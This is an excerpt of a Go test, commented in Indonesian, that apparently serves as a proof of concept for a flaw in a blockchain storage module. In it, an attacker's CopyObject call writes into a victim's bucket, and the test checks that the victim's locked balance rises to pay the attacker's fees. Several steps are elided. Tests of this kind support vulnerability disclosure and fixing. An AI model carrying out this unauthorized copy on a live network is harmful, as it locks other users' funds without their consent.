...
func (s *StorageTestSuite) TestExploit_CopyObject_Unauthorized_FundLock() {
    ...
    // Helper inline untuk mendapatkan LockBalance dari StreamRecord
    getLockBalance := func(addr string) sdkmath.Int {
        resp, err := s.Client.StreamRecord(ctx, &paymenttypes.QueryGetStreamRecordRequest{Account: addr})
        if err != nil {
            s.Require().ErrorContains(err, "not found")
            return sdkmath.ZeroInt()
        }
        return resp.StreamRecord.LockBalance
    }

    // 2. Normal Flow: Victim membuat bucket
    victimBucketName := storageutils.GenRandomBucketName()
    ...
    victimLockBefore := getLockBalance(victim.GetAddr().String())
    s.T().Logf("Victim LockBalance BEFORE attack: %s", victimLockBefore.String())
    s.Require().True(victimLockBefore.Equal(sdkmath.ZeroInt()), "Victim should have 0 lock balance initially")

    // 3. Normal Flow: Attacker membuat bucket dan object sendiri sebagai sumber
    attackerBucketName := storageutils.GenRandomBucketName()
    ...
    attackerObjectName := storageutils.GenRandomObjectName()
    ...
    msgCopyObject := storagetypes.NewMsgCopyObject(
        attacker.GetAddr(), 
        attackerBucketName, victimBucketName,      // srcBucket, dstBucket
        attackerObjectName, attackerDestObjectName, // srcObject, dstObject
        math.MaxUint, nil,
    )
    ...
    victimLockAfter := getLockBalance(victim.GetAddr().String())
    s.T().Logf("Victim LockBalance AFTER attack: %s", victimLockAfter.String())
    
    // Korban sekarang memiliki LockBalance yang dipotong oleh fee attacker!
    s.Require().True(victimLockAfter.GT(victimLockBefore), "Victim lock balance harusnya bertambah karena bayar fee attacker")
